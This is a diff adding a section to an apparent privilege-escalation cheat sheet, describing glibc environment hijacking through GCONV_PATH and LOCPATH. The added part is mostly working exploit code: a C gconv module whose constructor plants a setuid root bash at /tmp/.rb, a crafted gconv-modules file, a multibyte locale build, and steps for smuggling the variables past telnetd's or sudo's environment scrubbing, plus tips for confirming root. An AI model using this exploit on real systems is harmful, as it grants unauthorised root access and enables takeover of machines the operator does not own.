@@ -292,6 +292,47 @@ sudo python3 /opt/script.py
 bash -p
 ```
 
+## glibc Environment Hijacking (GCONV_PATH / LOCPATH)
+
+When you can inject environment variables into a **non-setuid root process** (sudo with
+`env_keep`, or a service that forwards client env — e.g. a custom `telnetd` running
+`login -p`), and `LD_PRELOAD` is blacklisted, fall back to `GCONV_PATH`. glibc honours it for
+any non-secure-execution process (setuid binaries strip it; a process *started by* root does
+not). It points glibc at a directory of charset-conversion modules; a malicious module's
+constructor runs as root the moment glibc loads it.
+
+```bash
+# Confirm the env actually reaches the privileged process first (e.g. dump its env).
+# For inetutils telnetd: scrub_env is a BLACKLIST (LD_, _RLD_, LIBPATH=, IFS=) — GCONV_PATH
+# and LOCPATH slip through.  strings telnetd | grep -E '_RLD_|LIBPATH|IFS'
+
+# 1. malicious gconv module — dlopen runs the constructor before any symbol lookup
+cat > /tmp/m.c <<'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) void x(void){ setuid(0); setgid(0);
+  system("cp /bin/bash /tmp/.rb; chmod 6755 /tmp/.rb"); }
+EOF
+mkdir -p /tmp/gconv
+gcc -shared -fPIC -o /tmp/gconv/pwn.so /tmp/m.c
+printf 'module\tINTERNAL\tPWN//\tpwn\t1\nmodule\tPWN//\tINTERNAL\tpwn\t1\n' > /tmp/gconv/gconv-modules
+
+# 2. setlocale needs the locale to EXIST — build it under LOCPATH (also not scrubbed).
+#    CRITICAL: make PWN a MULTIBYTE codeset (copy the UTF-8 charmap, mb_cur_max 6). A
+#    single-byte/ASCII codeset lets glibc use a builtin fast path and the module only loads
+#    AFTER the privilege drop; multibyte forces the external converter inside the root process.
+zcat /usr/share/i18n/charmaps/UTF-8.gz > /tmp/pwn.cm
+sed -i 's/<code_set_name>.*/<code_set_name> "PWN"/; s/<mb_cur_max>.*/<mb_cur_max> 6/' /tmp/pwn.cm
+mkdir -p /tmp/loc
+LOCPATH=/tmp/loc localedef -f /tmp/pwn.cm -i en_US /tmp/loc/en_US.PWN
+
+# 3. deliver GCONV_PATH=/tmp/gconv LOCPATH=/tmp/loc LC_ALL=en_US.PWN to the root process,
+#    then make it run (telnet: send these via the NEW-ENVIRON option, then log in normally).
+#    The root process does multibyte I/O -> dlopen pwn.so as root.  Then: /tmp/.rb -p
+```
+> Verify whose context loaded it: have the constructor write `id` to a marker file. uid=0 in
+> the marker = root. If it shows your own uid, the codeset was single-byte (use multibyte).
+
 ## Restricted Shell Escape (rbash / limited shell)
 
 ```bash
